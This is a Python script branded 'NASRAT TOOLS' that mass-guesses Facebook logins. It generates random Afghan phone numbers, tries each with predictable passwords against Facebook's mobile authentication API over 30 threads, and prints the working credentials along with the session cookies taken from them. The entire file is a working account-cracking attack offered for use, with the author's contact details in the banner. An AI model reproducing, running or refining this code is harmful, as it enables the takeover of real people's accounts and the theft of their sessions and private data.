import os,time,random,string,sys,uuid,json
from concurrent.futures import ThreadPoolExecutor

import requests

numbs = []
loop=0
ok_ids=[]
cp_ids=[]

G = '\033[32m'
Y = '\033[33m'
B = '\033[34m'
W = '\033[37m'
R = '\033[31m'


logo =f'''{R}
             WELCOME TO NASRAT TOOLS  

       _  _    __    ___  ____    __   ____
      ( \( )  /__\  / __)(  _ \  /__\ (_  _)
       )  (  /(__)\ \__ \ )   / /(__)\  )( 
      (_)\_)(__)(__)(___/(_)\_)(__)(__)(__){W}
                                    
{Y}|●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●|{W}
{G}[🔥]       NUMBER        : 0786842799         ●|{W}
{G}[🔥]       FACEBOOK      : Nasrat hack        ●|{W}
{G}[🔥]       TELEGRAM      : t.me/@Nasratha     ●|{W}
{G}[🔥]       TOOLS STATUS  : ACTIVE FREE        ●|{W}
{G}[🔥]       TOOLS VIRSION : 0.1                ●|{W}
{G}[🔥]       WATSAPP       : +93786842799       ●|{W}
{Y}|●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●|{W}
|       {R}(Use Airplane Mood For More Speed){W}     |
{Y}|●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●|{W}'''

def clear():
	os.system('clear')
	print(logo)

def line():
	print(f'{Y}|●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬By Nasrat▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●|{W}')

def main():
	clear()
	line()
	print(f'{G}|●             [1] Tools Free                 ●|{W}')
	print(f'{G}|●             [2] NASRAT HACK                ●|{W}')
	print(f'{G}|●             [3] NASA MOD                   ●|{W}')
	print(f'{G}|●             [4] Exit Program               ●|{W}')
	line()
	inp = str(input(f'{G}| Choose : {W}')).strip()
	if inp in ['1','01']:
		randomClone()
	elif inp in ['2','02']:
		os.system('xdg-open https://api.whatsapp.com/send?phone=+93786842799')
	elif inp in ['3','03']:
		os.system('xdg-open https://api.whatsapp.com/send?phone=+93782059574')
	elif inp in ['4','04']:
		print(f'{G} tanks for used nasrat tools{W}')
		exit()
	else:
		print(' | option not found in menu')
		time.sleep(2)
		main()
	

def randomClone():
	clear()
	line()
	print(f'{G}| Codes for afg : 078, 079, 074, 072, 070{W}')
	print(f'{G}| Codes for worldwide : 9378, 9379, 9374, 9372{W}')
	line()
	inp = str(input(f'{G}| Choose Code : {W}'))
	try:
		limit = int(input(f'{G}| Put Limit : {W}'))
	except:
		limit = 5000
	for _ in range(limit):
		numb = ''.join(random.choice(string.digits) for _ in range(7))
		numbs.append(numb)
	with ThreadPoolExecutor(max_workers = 30) as zahid:
		clear()
		line()
		ran = str(len(numbs))
		print(f'{G}| Method  : Tools Free                         |{W}')
		print(f'{G}| Limit : {ran}                                    |{W}')
		print(f'{G}| Use Airplane Mood For More Speed             |{W}')
		print(f'{G}| Made By : Nasrat Hack And Nasa Mod           |{W}')
		line()
		for number in numbs:
			ids = inp + number
			passwords = [number,ids,'۱۲۳۴۵۶','afghanistan','afg123','Afghanistan','afghan123','kabul123']
			zahid.submit(startClone,ids,passwords)
     

def startClone(ids,passwords):
	try:
		global loop
		sys.stdout.write(f'{G}\r| [AFG-CLONE] %s♛%s♛%s{W}'%(loop,len(ok_ids),len(cp_ids)))
		for pas in passwords:
			useragent=''
			data={
                                'adid': str(uuid.uuid4()),
                                'format': 'json',
                                'device_id': str(uuid.uuid4()),
                                'email': ids,
                                'password': pas,
                                'generate_analytics_claims': '1',
                                'community_id': '',
                                'cpl': 'true',
                                'try_num': '1',
                                'family_device_id': str(uuid.uuid4()),
                                'credentials_type': 'password',
                                'source': 'login',
                                'error_detail_type': 'button_with_disabled',
                                'enroll_misauth': 'false',
                                'generate_session_cookies': '1',
                                'generate_machine_id': '1',
                                'currently_logged_in_userid': '0',
                                'locale': 'en_GB',
                                'client_country_code': 'GB',
                                'fb_api_req_friendly_name': 'authenticate'}
			header ={
                                'User-Agent': useragent,
                                'Accept-Encoding':  'gzip, deflate',
                                'Accept': '*/*',
                                'Connection': 'keep-alive',
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Friendly-Name': 'authenticate',
                                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'}
			url = 'https://b-api.facebook.com/method/auth.login'
			data1 = requests.post(url,data=data,headers=header).text
			data2 = json.loads(data1)
			if 'session_key' in data2:
				print(f'{G}\r | [AFG-OK] {ids} | {pas}{W}')
				cookie = ";".join(_['name']+'='+_['value'] for _ in data2['session_cookies'])
				print(f'{G}\r | [COOKIE] : {cookie}{W}')
				ok_ids.append(ids)
				break
			else:pass
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
		pass
	except Exception as error:
		print(error)




main()
